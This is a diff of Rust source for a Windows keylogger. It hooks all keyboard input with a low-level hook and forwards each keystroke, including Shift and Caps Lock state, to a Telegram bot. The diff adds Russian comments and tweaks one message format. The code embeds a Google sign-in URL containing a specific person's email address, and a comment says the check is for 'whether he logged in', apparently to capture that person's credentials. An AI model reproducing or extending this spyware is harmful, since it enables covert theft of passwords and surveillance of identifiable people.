@@ -9,10 +9,12 @@ use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
 use winapi::shared::windef::HHOOK;
 use winapi::um::winuser::{DispatchMessageA, GetMessageA, TranslateMessage, MSG};
 
+// для телеграма
 use reqwest;
 use serde_json::json;
 use tokio;
 
+// определение url
 use std::ptr::null_mut;
 use dns_lookup::lookup_host;
 
@@ -20,7 +22,7 @@ mod config;
 
 // отправка сообщения в тг
 async fn bot(text: String) {
-    // Получаем токен бота и ID  чата
+    // Получаем токен бота и ID чата
     let bot_token = config::BOT_TOKEN;
     let chat_id = config::CHAT_ID;
 
@@ -41,21 +43,24 @@ async fn bot(text: String) {
 }
 
 unsafe extern "system" fn keyboard_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
+    // для определения зашёл он или нет
     let domain = "https://accounts.google.com/v3/signin/identifier?Email=amelchakov%40fmschool72.ru&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S992212922%3A1740144921379976&ddm=1";
     if (n_code == HC_ACTION && (w_param == WM_SYSKEYDOWN as usize || w_param == WM_KEYDOWN as usize)) && !is_site_open(domain) {
         let p_keyboard = &*(l_param as *const KBDLLHOOKSTRUCT);
         let caps_lock_on = (GetKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001) != 0;
         let shift_pressed = (GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) & 0x8000u16 as i16) != 0;
 
+        // определение caps_lock
         if caps_lock_on {
             tokio::spawn(bot(String::from("(Caps Lock) ")));
         }
 
+        // shift или не shift и вывод key pressed
         if shift_pressed && is_any_key_pressed() {
             if p_keyboard.vkCode == 164 {
                 tokio::spawn(bot(String::from("(Shift) Key pressed: Alt")));
             } else {
-                let s = format!("Key pressed: {}", p_keyboard.vkCode as u8 as char);
+                let s = format!("(Shift) Key pressed: {}", p_keyboard.vkCode as u8 as char);
                 tokio::spawn(bot(s));
             }
         } else {
@@ -77,6 +82,7 @@ unsafe extern "system" fn keyboard_proc(n_code: i32, w_param: WPARAM, l_param: L
     CallNextHookEx(null_mut(), n_code, w_param, l_param)
 }
 
+// Какая нибудь клавиша кроме Shift нажата?
 fn is_any_key_pressed() -> bool {
     for i in 0..256 {
         unsafe {
@@ -88,6 +94,7 @@ fn is_any_key_pressed() -> bool {
     false
 }
 
+// Закидываем удочку (начинаем записывать клавиши)
 fn set_hook() -> HHOOK {
     unsafe {
         let h_instance = GetModuleHandleA(null_mut());
@@ -95,6 +102,7 @@ fn set_hook() -> HHOOK {
     }
 }
 
+// убираем удочку (остановка)
 fn release_hook(h_hook: HHOOK) {
     unsafe {
         UnhookWindowsHookEx(h_hook);
@@ -142,12 +150,14 @@ fn is_site_open(domain: &str) -> bool {
 
 #[tokio::main]
 async fn main() {
+    // закидываем удочку
     let h_hook = set_hook();
     if h_hook.is_null() {
         eprintln!("Failed to install hook!");
         return;
     }
 
+    // выводим нажатые
     unsafe {
         let mut msg: MSG = std::mem::zeroed();
         while GetMessageA(&mut msg, null_mut(), 0, 0) != 0 {
@@ -156,5 +166,6 @@ async fn main() {
         }
     }
 
+    // остановка
     release_hook(h_hook);
 }
